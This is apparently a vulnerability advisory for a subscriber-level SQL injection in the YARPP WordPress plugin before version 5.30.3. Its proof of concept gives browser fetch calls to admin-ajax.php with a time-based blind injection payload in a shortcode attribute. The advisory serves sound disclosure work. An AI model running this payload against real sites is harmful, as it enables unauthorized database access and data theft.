## WordPress Plugin Vulnerabilities

# YARPP - Yet Another Related Posts Plugin < 5.30.3 - Subscriber+ SQLi

### Description

The plugin does not validate and escape some of its shortcode attributes before using them in SQL statement/s, which could allow any authenticated users, such as subscribers to perform SQL Injection attacks.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user (the reference id must be an existing post ID):
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[yarpp reference\_id='1' recent='1 DAY) AND (SELECT 42 FROM (SELECT(SLEEP(5)))b']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
(Could not exploit the below so far, despite the data being injected)
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[yarpp reference\_id='1' limit='aa YOLO bla-bla-bla']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
